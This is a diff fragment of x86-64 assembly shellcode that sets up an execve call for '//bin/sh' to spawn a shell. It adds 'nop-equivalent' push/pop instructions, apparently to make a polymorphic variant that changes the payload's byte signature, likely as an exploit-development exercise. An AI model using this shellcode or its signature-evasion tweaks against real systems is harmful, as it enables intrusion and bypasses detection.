@@ -10,10 +10,13 @@ _start:
 	mov	qword rbx, '//bin/sh'	; extra / to bring to 8 chars  
 	shr	rbx, 0x8		; shift off byte 0x48
 
+	push byte 0x90			; nop equ
+	pop rcx				; nop equ 
+
 	push	rbx			; filename
-	mov	rdi, rsp		; 
+	mov	rdi, rsp		; filename 
 	push	rax			; nulls
-	push	rdi			; second portion 
+	push	rdi			; second 
 	mov	rsi, rsp		; execve struct
 
 ;	mov al,	0x3b			; execve syscall  
